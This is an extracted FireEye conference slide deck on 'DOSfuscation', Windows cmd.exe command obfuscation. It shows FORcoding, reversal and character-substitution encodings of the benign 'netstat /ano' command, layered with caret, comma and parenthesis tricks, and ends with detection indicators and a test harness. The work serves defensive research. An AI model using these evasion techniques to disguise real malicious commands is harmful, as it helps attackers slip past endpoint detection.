#ForCompatibilityReasons #RisthenewC
147 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r netstat /ano
#ForCompatibilityReasons #RisthenewC
148 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r netstat /ano
https://s3.caradvice.com.au/thumb/1200/630/wpcontent/uploads/2014/01/ownerreview-honda-cr-v.jpg 149 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r netstat /ano
Troll-pportunity TM
150 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd Never Gonna Give You Up/vNever Gonna Let You Down/r netstat /ano

151 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://postmediavancouversun2.files.wordpress.com/2016/10/giphy.gif

Payload Obfuscation 2 of 4: FORcoding
· cmd \c echo %PATH%

152 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

/v /r netstat /ano

Payload Obfuscation 2 of 4: FORcoding
· cmd \c echo %PATH%

153 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

/v /r netstat /ano

Payload Obfuscation 2 of 4: FORcoding
· cmd \c echo %PATH%

154 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

/v /r netstat /ano

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r netstat /ano
155 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=nets /ao&&..."
156 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN ( net s /ao 0 1 2 3 4 5 6 7
157 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

) DO..."

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 n
net s /ao 01234567
158 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

) DO..."

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 n e
net s /ao 0 12 3 4 5 6 7

) DO..."

159 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 2 n e t
net s /ao 01234567

) DO..."

160 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 2 3 2 6 2 4 5 6 0 7 net st at / ano
net s /ao 0 1 2 3 4 5 6 7

) DO..."

161 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 2 3 2 6 2 4 5 6 0 7 1337) DO..." net st at / ano

net s /ao 0 1 2 3 4 5 6 7

Arbitrary end-of-index delimiter

162 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 2 3 2 6 2 4 5 6 0 7 1337) DO set final=!final!!unique:~%A,1!&&..."
Appending char at each index (%A) to !final! env var.
163 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 2 3 2 6 2 4 5 6 0 7 1337) DO set final=!final!!unique:~%A,1!&&IF %A==1337 CALL %final:~-12%"
· ==1337 · EQU 1337 · GEQ 1337 · GTR 1336

164 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://ss64.com/nt/if.html

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 2 3 2 6 2 4 5 6 0 7 1337) DO set final=!final!!unique:~%A,1!&&IF %A==1337 CALL %final:~-12%"
165 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=OnBeFtUsS C/AaToE&&FOR %A IN (1 3 5 7 5 13 5 9 11 13 1 15 1337) DO set final=!final!!unique:~%A,1!&&IF %A==1337 CALL %final:~12%"
166 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /r "set unique=OnBeFtUsS C/AaToE&&FOR %A IN (1 3 5 7 5 13 5 9 11 13 1 15 1337) DO set final=!final!!unique:~%A,1!&&IF %A==1337 CALL %final:~12%"
Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...
167 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· cMd /v /R "sET unIQuE=OnBeFtUsS C/AaToE&&foR %a iN (1 3 5 7 5 13 5 9 11 13 1 15 1337) dO sEt fINal=!finAl!!uniQue:~%a,1!&&iF %a==1337 CalL %fInAl:~12%"

· Random case · · · · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

168 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· cMd/v/R"sET unIQuE=OnBeFtUsS C/AaToE&&foR %a iN (1,3;5,7;5,13;5,9;11, 13,1;15,1337)dO sEt fINal=!finAl!!uniQue:~%a,1!&&iF %a==1337 CalL %fInAl:~12%"

· Random case · Whitespace (-/+) · · · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

169 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· cMd /v /R "sET unIQuE=OnBeFtUsS C/AaToE && foR %a iN ( 1 3 5 7 5 13 5 9 11 13 1 15 1337 ) dO sEt fINal=!finAl!!uniQue:~ %a, 1!&& iF %a == 1337 CalL %fInAl:~ -12% "

· Random case · Whitespace (-/+) · · · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

170 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· ,;cMd;/v;,;/R "sET unIQuE=OnBeFtUsS C/AaToE &&,; foR ;,;%a ,;;iN;,,;( , 1; 3 5 7 5 13 5,,9 11 13 1;;15 1337;,),;,;dO,,;;sEt fINal=!finAl!!uniQue:~ %a, 1!&&;;;iF,, ,%a;;,==,,;1337,;;,CalL;,,;%fInAl:~ -12% "

· Random case · Whitespace (-/+) · Comma & semicolon · · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

171 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· ,;c^Md;/^v;,;/^R "sE^T ^ unIQ^uE=OnBeFt^UsS C/AaToE &&,; fo^R;,;%^a,;; i^N;,,;( , 1; 3 5 7 5 1^3 5,,9 11 1^3 1;;15 ^ 13^37;,),;,;d^O,,;;s^Et fI^Nal=!finAl!!uni^Que:~ %^a, 1!&&;;i^F,,%^a;,=^=,;13^37,;Ca^lL;,%fIn^Al:~ -^12%"

· Random case · Whitespace (-/+) · Comma & semicolon · Caret · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

172 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· ,;c^Md;/^v;,;/^R "((sE^T ^ unIQ^uE=OnBeFt^UsS C/AaToE ))&&,; fo^R;,;%^a,;; i^N;,,;( , 1; 3 5 7 5 1^3 5,,9 11 1^3 1;;15 ^ 13^37;,),;,;d^O,,(;(;s^Et fI^Nal=!finAl!!uni^Que:~ %^a,1!))&&(;i^F,%^a,=^=;13^37,(Ca^lL;%fIn^Al:~ -^12%))"

· Random case · Whitespace (-/+) · Comma & semicolon · Caret · Parentheses ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

173 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding

· ,;c^Md;/^v;,;/^R "((sE^T ^ unIQ^uE=OnBeFt^UsS C/AaToE ))&&,; fo^R;,;%^a,;; i^N;,,;( ,+1; 3 5 7 +5 1^3 +5,,9 11 +1^3 +1;;+15 ^+13^37;,),;,;d^O,,(;(;s^Et fI^Nal=!finAl!!uni^Que:~ %^a,1!))&&(;i^F,%^a=^=+13^37,(Ca^lL;%fIn^Al:~ -^12%))"

· Random case · Whitespace (-/+) · Comma & semicolon · Caret · Parentheses · Explicit signing

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

174 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
Troll-pportunity TM
175 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 3 of 4: Reversal
· cmd /v /r "set reverse=ona/ tatsten&&FOR /L %A IN (11 -1 0) DO set final=!final!!reverse:~%A,1!&&IF %A==0 CALL %final:~-12%"
Reverse
Reversing is similar to FORcoding, but has simpler indexing with FOR loop's /L argument.
FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 2 3 2 6 2 4 5 6 0 7 1337) DO set final=!final!!unique:~%A,1!&&IF %A==1337 CALL %final:~-12%"
176 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 3 of 4: Reversal
· cmd /v /r "set reverse=OoBnFaU/S CtAaTtIsOtNe!n&&FOR /L %A IN (23 -2 1) DO set final=!final!!reverse:~%A,1!&&IF %A==1 CALL %final:~-12%"
Reverse
Reversing is similar to FORcoding, but has simpler indexing with FOR loop's /L argument.
FORcoding
· cmd /v /r "set unique=nets /ao&&FOR %A IN (0 1 2 3 2 6 2 4 5 6 0 7 1337) DO set final=!final!!unique:~%A,1!&&IF %A==1337 CALL %final:~-12%"
177 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 3 of 4: Reversal
· cmd /v /r "set reverse=OoBnFaU/S CtAaTtIsOtNe!n&&FOR /L %A IN (23 -2 1) DO set final=!final!!reverse:~%A,1!&&IF %A==1 CALL %final:~-12%"
· ==1 · EQU 1 · LEQ 1 · LSS 2

178 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://ss64.com/nt/if.html

Payload Obfuscation 3 of 4: Reversal
· cmd /v /r "set reverse=OoBnFaU/S CtAaTtIsOtNe!n&&FOR /L %A IN (23 -2 1) DO set final=!final!!reverse:~%A,1!&&IF %A==1 CALL %final:~-12%"
C:\> echo %final% !final!netstat /ano C:\> echo %final:~-12% netstat /ano
179 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 3 of 4: Reversal
· cmd /v /r "set reverse=OoBnFaU/S CtAaTtIsOtNe!n&&FOR /L %A IN (23 -2 1) DO set final=!final!!reverse:~%A,1!&&IF %A==1 CALL %final:~7%"
C:\> echo %final% !final!netstat /ano C:\> echo %final:~7% netstat /ano
180 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 3 of 4: Reversal
· cmd /v /r "set reverse=OoBnFaU/S CtAaTtIsOtNe!n&&FOR /L %A IN (23 -2 1) DO set final=!final!!reverse:~%A,1!&&IF %A==1 CALL %final:*final!=%"
C:\> echo %final% !final!netstat /ano C:\> echo %final:~7% netstat /ano C:\> echo %final:*final!=% netstat /ano
181 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 4 of 4: FINcoding
· cmd /v /r "set command=netstat /ano&&CALL %command%"
182 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 4 of 4: FINcoding t  Z
· cmd /v /r "set command=neZsZaZ /ano&&CALL %command%"
183 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 4 of 4: FINcoding t  Z
· cmd /v /r "set command=neZsZaZ /ano&&set sub1=!command:Z=t!&&CALL %command%"
Z t
184 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 4 of 4: FINcoding t  Z
· cmd /v /r "set command=neZsZaZ /ano&&set sub1=!command:Z=t!&&CALL %sub1%"
Z t
185 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 4 of 4: FINcoding t  Z
a 7
· cmd /v /r "set command=neZsZ7Z /7no&&set sub1=!command:Z=t!&&set sub2=!sub1:7=a!&&CALL %sub2%"
Z t 7 a
186 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 4 of 4: FINcoding t  Z
a 7 n ?
· cmd /v /r "set command=?eZsZ7Z /7?o&&set sub1=!command:Z=t!&&set sub2=!sub1:7=a!&&set sub3=!sub2:?=n!&&CALL %sub3%"
Z t 7 a ? n
187 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 4 of 4: FINcoding
· cmd /v /r "set command=?eZsZ7Z /7?o&&set sub1=!command:Z=t!&&set sub2=!sub1:7=a!&&set sub3=!sub2:?=n!&&CALL %sub3%"

This same command in Out-FINcodedCommand POC:
· cmd /c "set command=?eZsZ7Z /7?o&&cmd /c set sub1=%command:Z=t%^&^&cmd /c set sub2=%sub1:7=a%^^^&^^^&cmd /c set sub3=%sub2:?=n%^^^^^^^&^^^^^^^&cmd /c %sub3%"

188 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

· No /V so %var% (not !var!) · ·

Payload Obfuscation 4 of 4: FINcoding
· cmd /v /r "set command=?eZsZ7Z /7?o&&set sub1=!command:Z=t!&&set sub2=!sub1:7=a!&&set sub3=!sub2:?=n!&&CALL %sub3%"

This same command in Out-FINcodedCommand POC:
· cmd /c "set command=?eZsZ7Z /7?o&&cmd /c set sub1=%command:Z=t%^&^&cmd /c set sub2=%sub1:7=a%^^^&^^^&cmd /c set sub3=%sub2:?=n%^^^^^^^&^^^^^^^&cmd /c %sub3%"

189 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

· No /V so %var% (not !var!) · Multiple cmd.exe invocations ·

Payload Obfuscation 4 of 4: FINcoding
· cmd /v /r "set command=?eZsZ7Z /7?o&&set sub1=!command:Z=t!&&set sub2=!sub1:7=a!&&set sub3=!sub2:?=n!&&CALL %sub3%"

This same command in Out-FINcodedCommand POC:
· cmd /c "set command=?eZsZ7Z /7?o&&cmd /c set sub1=%command:Z=t%^&^&cmd /c set sub2=%sub1:7=a%^^^&^^^&cmd /c set sub3=%sub2:?=n%^^^^^^^&^^^^^^^&cmd /c %sub3%"

190 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

· No /V so %var% (not !var!) · Multiple cmd.exe invocations · Layered escaping of &&

Payload Obfuscation 4 of 4: FINcoding
· cmd /v /r "set command=?eZsZ7Z /7?o&&set sub1=!command:Z=t!&&set sub2=!sub1:7=a!&&set sub3=!sub2:?=n!&&CALL %sub3%"

This same command in Out-FINcodedCommand POC:
· cmd /c "set command=?eZsZ7Z /7?o&&cmd /c set sub1=%command:Z=t%^&^&cmd /c set sub2=%sub1:7=a%^^^&^^^&cmd /c set sub3=%sub2:?=n%^^^^^^^&^^^^^^^&cmd /c %sub3%"

191 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

· No /V so %var% (not !var!) · Multiple cmd.exe invocations · Layered escaping of &&

Payload Obfuscation 4 of 4: FINcoding
· cmd /v /r "set command=?eZsZ7Z /7?o&&set sub1=!command:Z=t!&&set sub2=!sub1:7=a!&&set sub3=!sub2:?=n!&&CALL %sub3%"

This same command in Out-FINcodedCommand POC:
· cmd /c "set command=?eZsZ7Z /7?o&&cmd /c set sub1=%command:Z=t%^&^&cmd /c set sub2=%sub1:7=a%^^^&^^^&cmd /c set sub3=%sub2:?=n%^^^^^^^&^^^^^^^&cmd /c %sub3%"

192 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

· No /V so %var% (not !var!) · Multiple cmd.exe invocations · Layered escaping of &&

OUTLINE
State of the Union Obfuscation Obfuscation in the Wild: 3 Case Studies Whose Binary is it Anyway: Obfuscating Binary Names Deep Dive: Character Insertion Obfuscation Deep(er) Dive: Advanced Payload Obfuscation C:\> Invoke-DOSfuscation Demo Detecting DOSfuscation
193 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

DISCLAIMER
· Please do not use this tool for evil. · FIN7, FIN8 & APT32: Please do not use this tool at all 
https://github.com/danielbohannon/Invoke-DOSfuscation
194 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

OUTLINE
State of the Union Obfuscation Obfuscation in the Wild: 3 Case Studies Whose Binary is it Anyway: Obfuscating Binary Names Deep Dive: Character Insertion Obfuscation Deep(er) Dive: Advanced Payload Obfuscation Invoke-DOSfuscation Demo C:\> Detecting DOSfuscation
195 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Detecting DOSfuscation (more details in white paper)

· Long argument length · High frequency of obfuscation characters: , ; ^ " ( ) · Rare obfuscation of internal commands:
· C^AL^^L or ;SET, · Unusual execution flags:
· /V or /R (or /^R) · Variable substring and replacement syntax:
· %var:~7,1% or !var:~%a,1! or !var:*var=!
196 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://moviefiednyc.files.wordpress.com/2013/11/e 0006-ace-ventura-pet-detective-512c7fac5d838.png

Detecting DOSfuscation (more details in white paper)

· Suspicious sub-command and stdin child process artifacts · FOR loop executes sub-command via separate cmd.exe invocation
· Cmd.exe pipeline to add'l binary (e.g. findstr.exe) spawns pre-pipe arguments via separate cmd.exe invocation with these arguments: cmd.exe /S /D /c" set"

No space between /c & "

Double whitespace

Whitespace after first "

197 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

198 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED. http://smurfitschoolblog.com/wp-content/uploads/2016/10/MissingOutImg_1-900x578.jpg

Obfuscation
199 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED. http://smurfitschoolblog.com/wp-content/uploads/2016/10/MissingOutImg_1-900x578.jpg

Detecting DOSfuscation ­ Test Harness FTW!
· Invoke-DOSfuscationTestHarness.psm1 THE module I used to develop detection ideas · Invoke-DosTestHarness · Get-DosDetectionMatch
· Released 4000 sample obfuscated commands as .txt & .evtx files for static and dynamic purposes
200 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Key Takeaways
· Attackers are using more creative command argument obfuscation techniques · Cmd.exe supports significant obfuscation and encoding capabilities not yet
seen in the wild · Defenders must match levels of attacker creativity with detection creativity
201 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Credit Where Credit Is Due
· FireEye Advanced Practices Team · Nick Carr, Matthew Dunwoody, Ben Withnell
· My wife: Paige · 9 months research & hunting (500+ hours) · 320 hours Invoke-DOSfuscation tool development · 100 hours slide/presentation development & 100 hours white paper
202 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Thanks! Questions?
· Daniel Bohannon · Twitter :: @danielhbohannon · Blog :: http://danielbohannon.com
· Code: https://github.com/danielbohannon/Invoke-DOSfuscation · White paper: https://www.fireeye.com/blog/threat-
research/2018/03/dosfuscation-exploring-obfuscation-and-detectiontechniques.html
203 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

